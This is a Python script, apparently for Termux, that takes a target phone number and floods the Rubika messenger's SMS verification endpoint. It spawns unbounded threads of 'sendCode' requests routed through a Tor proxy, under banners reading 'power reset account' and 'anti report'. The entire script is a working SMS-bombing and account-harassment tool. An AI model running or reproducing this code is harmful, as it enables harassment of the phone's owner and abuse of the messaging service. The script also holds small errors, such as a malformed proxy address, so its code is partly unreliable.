# Connect to the tor first, then set the port and IP, then run the script
# python
import os
# ------- imports ----
# !! colors !!
import time,sys
green="\033[32m"
red ="\033[31m"
blue="\033[36m"
pink="\033[35m"
yellow="\033[93m"
darkblue="\033[34m"
white="\033[00m"
# !!   !!
# ---- try ---
try:
    import requests
except:
    os.system("pip install requests")
try:
    from threading import Thread
except:
    os.system("pip install threading")
try:
    from datetime import datetime
except:
    os.system("pip install datetime")
from datetime import datetime
from threading import Thread
from time import sleep
import requests
# ///// the proxy ////
proxy = {"https": "127.0.0.1.8000"}
# /////////

tm = requests.get("https://api.codebazan.ir/time-date/?td=all").text
tim = (datetime.now())
try:
    os.system("pkg install tor")
except:
    print ()
try:
    os.system("clear")
except:
    os.system("cls")
sleep(1)
print(F'{blue}')
print('\nF/H\n')
sleep(1)
m = f"""\n\n
{green}_____________________
{darkblue}[power reset account]
{green}—————————————————————
{darkblue}
---------------------
{yellow}⟨⟨ {blue}{tm} {yellow}⟩⟩{darkblue}
---------------------\n
{green}
/////////////////////////////////////////
//////////{blue}anti filter{green}///////////////////
///////////////////////////////////////
/////////{blue}anti report{green}//////////////////
||||||||||||||||||||||||||||||||||||||
//////////////////////////////////////
/////////////////////////////////////
\n
"""
for m in m:
        sys.stdout.write(m)
        sys.stdout.flush()
        time.sleep(0.03)

sleep(1)
print ()
# ---------- rubika ---------
def rubika(phone):
    te = (datetime.today())
    #rubika api
    ruH = {"Host": "messengerg2c4.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    ruD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD, proxies=proxy)
        if "OK" in ruR.text:
            sleep(1)
            print (f"{pink}[+]{red} |SEND| {blue}elimination filtered-{green}{te}\n")
        else:
            sleep(1)
            print (f"{pink}[!] {red}|SEND| {blue}anti report-{green}{te}{blue}...\n")
    except:
        sleep(0.9)
        print (f"{pink}[!] {red}|SEND| {blue}anti report-{green}{te}{blue}...\n")

def main():
    phone = str(input(f"""\n
{red}[ {blue}{tim} {red}]\n\n
{white}
~~~~~~~~~~~~~~~~~~~
|||||||||||||||||||
|||====||★||====|||
|||====||★||====|||
||| {yellow}black mester {white}|||
|||||||||||||||||||
|||||||||||||||||||
|||||||||||||||||||
~~~~~~~~~~~~~~~~~~~


             
{green}phone number reported on rubika for elimination report {red}[+98XXXXX] {darkblue}⟩⟩⟩ {blue}"""))
    while True:
        Thread(target=rubika, args=[phone]).start()


if __name__ == "__main__":
    main()
